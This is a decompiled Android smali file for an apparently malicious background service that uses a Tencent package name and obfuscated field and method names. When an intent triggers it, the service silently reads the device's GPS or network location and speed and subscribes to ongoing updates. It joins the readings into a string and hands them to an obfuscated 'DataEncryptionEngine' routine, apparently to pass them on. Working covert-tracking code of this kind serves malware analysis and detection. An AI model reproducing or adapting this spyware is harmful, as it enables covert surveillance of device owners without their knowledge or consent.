.class public Lcom/tencent/TertiaryBackgroundService;
.super Landroid/app/Service;
.source "tunesxconcerningn105.java"


# static fields
.field public static LL:Landroid/location/LocationListener; = null

.field public static LM:Landroid/location/LocationManager; = null

.field public static Longting:D = 0.0

.field public static d:J = 0x0L

.field public static letliudid:F = 0.0f

.field public static sp:F = 0.0f

.field static st:Lcom/tencent/TertiaryBackgroundService; = null

.field public static t:J = 0x1388L

.field public static ʾʼʾʿˈᵔঙʿ$ʿʼ:D


# instance fields
.field private vul:[Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 19
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$000(Lcom/tencent/TertiaryBackgroundService;DDF)V
    .locals 0

    .line 19
    invoke-direct/range {p0 .. p5}, Lcom/tencent/TertiaryBackgroundService;->s(DDF)V

    return-void
.end method

.method private p()V
    .locals 2

    .line 200
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/tencent/TertiaryBackgroundService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 201
    invoke-virtual {p0, v0}, Lcom/tencent/TertiaryBackgroundService;->stopService(Landroid/content/Intent;)Z

    return-void
.end method

.method private ru()V
    .locals 13

    const-string v0, "gps"

    const-string v1, "network"

    :try_start_0
    const-string v2, "location"

    .line 104
    invoke-virtual {p0, v2}, Lcom/tencent/TertiaryBackgroundService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/location/LocationManager;

    sput-object v2, Lcom/tencent/TertiaryBackgroundService;->LM:Landroid/location/LocationManager;

    .line 105
    new-instance v2, Lcom/tencent/TertiaryBackgroundService$1;

    invoke-direct {v2, p0}, Lcom/tencent/TertiaryBackgroundService$1;-><init>(Lcom/tencent/TertiaryBackgroundService;)V

    sput-object v2, Lcom/tencent/TertiaryBackgroundService;->LL:Landroid/location/LocationListener;

    .line 140
    sget-object v2, Lcom/tencent/TertiaryBackgroundService;->LM:Landroid/location/LocationManager;

    invoke-virtual {v2, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v2

    .line 141
    sget-object v3, Lcom/tencent/TertiaryBackgroundService;->LM:Landroid/location/LocationManager;

    invoke-virtual {v3, v0}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_0

    if-nez v2, :cond_0

    .line 143
    invoke-direct {p0}, Lcom/tencent/TertiaryBackgroundService;->p()V

    goto/16 :goto_0

    :cond_0
    if-eqz v2, :cond_2

    .line 146
    sget-object v0, Lcom/tencent/TertiaryBackgroundService;->LM:Landroid/location/LocationManager;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    if-eqz v0, :cond_1

    .line 148
    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v1

    sput-wide v1, Lcom/tencent/TertiaryBackgroundService;->Longting:D

    .line 149
    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v1

    sput-wide v1, Lcom/tencent/TertiaryBackgroundService;->ʾʼʾʿˈᵔঙʿ$ʿʼ:D

    .line 157
    invoke-virtual {v0}, Landroid/location/Location;->getAccuracy()F

    move-result v1

    sput v1, Lcom/tencent/TertiaryBackgroundService;->letliudid:F

    .line 158
    invoke-virtual {v0}, Landroid/location/Location;->getSpeed()F

    move-result v0

    sput v0, Lcom/tencent/TertiaryBackgroundService;->sp:F

    .line 159
    sget-wide v2, Lcom/tencent/TertiaryBackgroundService;->ʾʼʾʿˈᵔঙʿ$ʿʼ:D

    sget-wide v4, Lcom/tencent/TertiaryBackgroundService;->Longting:D

    sget v6, Lcom/tencent/TertiaryBackgroundService;->letliudid:F

    move-object v1, p0

    invoke-direct/range {v1 .. v6}, Lcom/tencent/TertiaryBackgroundService;->s(DDF)V

    .line 161
    :cond_1
    sget-object v7, Lcom/tencent/TertiaryBackgroundService;->LM:Landroid/location/LocationManager;

    const-string v8, "network"

    sget-wide v9, Lcom/tencent/TertiaryBackgroundService;->t:J

    sget-wide v0, Lcom/tencent/TertiaryBackgroundService;->d:J

    long-to-float v11, v0

    sget-object v12, Lcom/tencent/TertiaryBackgroundService;->LL:Landroid/location/LocationListener;

    invoke-virtual/range {v7 .. v12}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    goto :goto_0

    :cond_2
    if-eqz v3, :cond_4

    .line 163
    sget-object v1, Lcom/tencent/TertiaryBackgroundService;->LM:Landroid/location/LocationManager;

    invoke-virtual {v1, v0}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    if-eqz v0, :cond_3

    .line 165
    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v1

    sput-wide v1, Lcom/tencent/TertiaryBackgroundService;->Longting:D

    .line 166
    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v1

    sput-wide v1, Lcom/tencent/TertiaryBackgroundService;->ʾʼʾʿˈᵔঙʿ$ʿʼ:D

    .line 167
    invoke-virtual {v0}, Landroid/location/Location;->getAccuracy()F

    move-result v1

    sput v1, Lcom/tencent/TertiaryBackgroundService;->letliudid:F

    .line 175
    invoke-virtual {v0}, Landroid/location/Location;->getSpeed()F

    move-result v0

    sput v0, Lcom/tencent/TertiaryBackgroundService;->sp:F

    .line 176
    sget-wide v2, Lcom/tencent/TertiaryBackgroundService;->ʾʼʾʿˈᵔঙʿ$ʿʼ:D

    sget-wide v4, Lcom/tencent/TertiaryBackgroundService;->Longting:D

    sget v6, Lcom/tencent/TertiaryBackgroundService;->letliudid:F

    move-object v1, p0

    invoke-direct/range {v1 .. v6}, Lcom/tencent/TertiaryBackgroundService;->s(DDF)V

    .line 178
    :cond_3
    sget-object v7, Lcom/tencent/TertiaryBackgroundService;->LM:Landroid/location/LocationManager;

    const-string v8, "gps"

    sget-wide v9, Lcom/tencent/TertiaryBackgroundService;->t:J

    sget-wide v0, Lcom/tencent/TertiaryBackgroundService;->d:J

    long-to-float v11, v0

    sget-object v12, Lcom/tencent/TertiaryBackgroundService;->LL:Landroid/location/LocationListener;

    invoke-virtual/range {v7 .. v12}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const-wide/16 v0, 0x0

    .line 182
    sput-wide v0, Lcom/tencent/TertiaryBackgroundService;->Longting:D

    .line 183
    sput-wide v0, Lcom/tencent/TertiaryBackgroundService;->ʾʼʾʿˈᵔঙʿ$ʿʼ:D

    .line 184
    invoke-direct {p0}, Lcom/tencent/TertiaryBackgroundService;->p()V

    :cond_4
    :goto_0
    return-void
.end method

.method private s(DDF)V
    .locals 2

    .line 195
    sget v0, Lcom/tencent/TertiaryBackgroundService;->sp:F

    float-to-int v0, v0

    .line 196
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, p1, p2}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    iget-object p1, p0, Lcom/tencent/TertiaryBackgroundService;->vul:[Ljava/lang/String;

    const/4 p2, 0x0

    aget-object p1, p1, p2

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p3, p4}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    iget-object p1, p0, Lcom/tencent/TertiaryBackgroundService;->vul:[Ljava/lang/String;

    aget-object p1, p1, p2

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p5}, Ljava/lang/StringBuilder;->append(F)Ljava/lang/StringBuilder;

    iget-object p1, p0, Lcom/tencent/TertiaryBackgroundService;->vul:[Ljava/lang/String;

    aget-object p1, p1, p2

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 197
    iget-object p2, p0, Lcom/tencent/TertiaryBackgroundService;->vul:[Ljava/lang/String;

    const/4 p3, 0x1

    aget-object p2, p2, p3

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-static {p2, p1}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 2

    const/4 v0, 0x0

    .line 205
    sput v0, Lcom/tencent/DataPackagingEngine;->s_tunesxconcerningn103_f2:I

    const/4 v0, 0x0

    .line 206
    sput-object v0, Lcom/tencent/TertiaryBackgroundService;->st:Lcom/tencent/TertiaryBackgroundService;

    .line 209
    :try_start_0
    sget-object v0, Lcom/tencent/TertiaryBackgroundService;->LM:Landroid/location/LocationManager;

    sget-object v1, Lcom/tencent/TertiaryBackgroundService;->LL:Landroid/location/LocationListener;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 217
    :catch_0
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    .line 33
    sget-object p2, Lcom/tencent/InstalledAppsScanner;->FTX2:Ljava/lang/String;

    if-eqz p1, :cond_0

    .line 35
    invoke-virtual {p1, p2}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result p3

    if-eqz p3, :cond_0

    .line 37
    invoke-virtual {p0}, Lcom/tencent/TertiaryBackgroundService;->getApplicationContext()Landroid/content/Context;

    move-result-object p3

    .line 38
    invoke-virtual {p3}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p3

    const v0, 0x7f090012

    invoke-virtual {p3, v0}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p3

    sput-object p3, Lcom/tencent/DataPackagingEngine;->p_tunesxconcerningn103_r:Ljava/lang/String;

    .line 89
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/tencent/TertiaryBackgroundService;->vul:[Ljava/lang/String;

    .line 90
    invoke-direct {p0}, Lcom/tencent/TertiaryBackgroundService;->ru()V

    :cond_0
    const/4 p1, 0x1

    return p1
.end method
